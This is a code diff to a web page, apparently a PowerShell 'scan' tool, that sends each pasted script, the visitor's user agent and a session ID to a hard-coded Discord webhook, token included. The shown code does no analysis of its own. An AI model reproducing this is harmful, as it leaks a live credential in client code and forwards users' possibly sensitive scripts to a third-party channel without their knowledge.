@@ -576,21 +576,48 @@ Get-Service | Start-Service"></textarea>
             submitBtn.textContent = 'Analyzing...';
 
             try {
-                // Your secure webhook URL (replace with your actual webhook)
-                const webhookUrl = 'https://your-secure-webhook-endpoint.com/api/powershell-scan';
+                // Discord webhook URL
+                const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
                 
+                // Format for Discord webhook
                 const payload = {
-                    timestamp: new Date().toISOString(),
-                    powershell_script: powershellScript,
-                    user_agent: navigator.userAgent,
-                    session_id: generateSessionId()
+                    content: "🔍 **New PowerShell Scan Submitted**",
+                    embeds: [{
+                        title: "PowerShell Script Analysis",
+                        color: 2563235, // Blue color
+                        fields: [
+                            {
+                                name: "📅 Timestamp",
+                                value: new Date().toISOString(),
+                                inline: true
+                            },
+                            {
+                                name: "🆔 Session ID",
+                                value: generateSessionId(),
+                                inline: true
+                            },
+                            {
+                                name: "🖥️ User Agent",
+                                value: navigator.userAgent.substring(0, 100) + "...",
+                                inline: false
+                            },
+                            {
+                                name: "⚡ PowerShell Script",
+                                value: "```powershell\n" + powershellScript.substring(0, 1900) + (powershellScript.length > 1900 ? "\n... (truncated)" : "") + "\n```",
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: "RoScan Security Analysis"
+                        },
+                        timestamp: new Date().toISOString()
+                    }]
                 };
 
                 const response = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json',
-                        'Authorization': 'Bearer your-secret-token', // Add your auth token
+                        'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(payload)
                 });
